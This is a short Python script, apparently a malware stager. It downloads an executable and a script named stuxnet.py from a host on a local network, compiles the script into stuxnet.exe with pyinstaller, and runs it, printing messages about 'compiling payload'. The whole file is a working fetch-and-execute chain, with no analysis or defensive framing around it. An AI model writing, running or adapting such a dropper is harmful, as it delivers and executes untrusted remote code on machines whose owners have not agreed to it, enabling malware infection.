import requests

url_py = 'http://192.168.43.223/download'
url_bot = 'http://192.168.43.223/script'

r = requests.get(url_py)
with open('pyinstaller2.exe','wb') as f:
    f.write(r.content)
    print('[*] Pyinstaller downloaded')

r = requests.get(url_bot)
with open('stuxnet.py','wb') as f:
    f.write(r.content)
    print('[*] Script downloaded')

print('[*] Files downloaded...')
print('[*] Compiling payload now...')

import subprocess
cmd = subprocess.Popen('pyinstaller2.exe --onefile stuxnet.py',stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
output,err = cmd.communicate()
print(str(output))
print('-----------------------------')
print(str(err))

import os
os.chdir('dist')
subprocess.call('stuxnet.exe',stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)

